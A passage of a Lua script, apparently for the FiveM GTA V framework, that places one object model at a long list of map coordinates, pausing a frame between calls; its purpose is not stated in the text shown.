            Citizen.Wait(0)
        CreateObject(3821613641, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(3821613641, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
